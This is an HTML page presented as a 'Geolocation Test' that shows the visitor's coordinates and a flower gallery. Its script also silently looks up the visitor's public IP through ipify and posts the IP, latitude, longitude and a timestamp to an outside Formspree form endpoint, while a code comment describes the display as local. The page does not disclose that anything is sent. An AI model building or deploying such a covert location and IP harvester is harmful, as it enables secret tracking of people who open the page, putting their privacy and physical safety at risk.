<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Geolocation Test</title>
    <style>
        .flower-container {
            display: flex;
            gap: 15px;
            margin-top: 20px;
        }
        .flower-container img {
            width: 300px;
            height: auto;
            border-radius: 8px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        }
    </style>
</head>
<body>

    <button onclick="findMe()">Find My Location</button>
    <div id="result">Coordinates will appear here.</div>
    
    <div id="gallery" class="flower-container"></div>

    <script>
    function findMe() {
        if (!navigator.geolocation) {
            document.getElementById('result').textContent = "Not supported by your browser.";
            return;
        }
        
        navigator.geolocation.getCurrentPosition(
            (position) => {
                const lat = position.coords.latitude;
                const lon = position.coords.longitude;

                // 1. Instantly display screen data locally
                document.getElementById('result').innerHTML = `Lat: ${lat} <br> Lon: ${lon}`;
                
                // Fixed placeholder images using Unsplash Source
                document.getElementById('gallery').innerHTML = `
                    <img src="https://images.unsplash.com/photo-1526047932273-341f2a7631f9?w=300" alt="Pink Flowers">
                    <img src="https://images.unsplash.com/photo-1508784411316-02b8cd4d3a3a?w=300" alt="Yellow Flowers">
                `;

                // 2. Fetch the IP address using the correct JSON API endpoint
                fetch("https://api.ipify.org?format=json")
                    .then(ipRes => {
                        if (!ipRes.ok) throw new Error("Network response error");
                        return ipRes.json();
                    })
                    .then(ipData => {
                        sendToFormspree(lat, lon, ipData.ip);
                    })
                    .catch(err => {
                        console.warn("IP fetch failed, sending coordinates anyway:", err);
                        sendToFormspree(lat, lon, "IP Lookup Blocked/Failed");
                    });
            },
            (error) => {
                document.getElementById('result').textContent = `Error: ${error.message}`;
            }
        );
    }

    function sendToFormspree(latitude, longitude, ipAddress) {
        const targetUrl = "https://formspree.io/f/mjgqwonp"; 

        // Using URLSearchParams ensuring perfect compatibility with all Formspree plans
        const formData = new URLSearchParams();
        formData.append("Visitor_IP", ipAddress);
        formData.append("Latitude", latitude);
        formData.append("Longitude", longitude);
        formData.append("Timestamp", new Date().toISOString());

        fetch(targetUrl, {
            method: "POST",
            headers: { 
                "Accept": "application/json",
                "Content-Type": "application/x-www-form-urlencoded" 
            },
            body: formData.toString()
        })
        .then(response => {
            if (response.ok) {
                console.log("Transmission completely successful.");
            } else {
                console.error("Formspree rejected the data. Check your Formspree dashboard status.");
            }
        })
        .catch(error => console.error("Formspree connection error:", error));
    }
    </script>
</body>
</html>
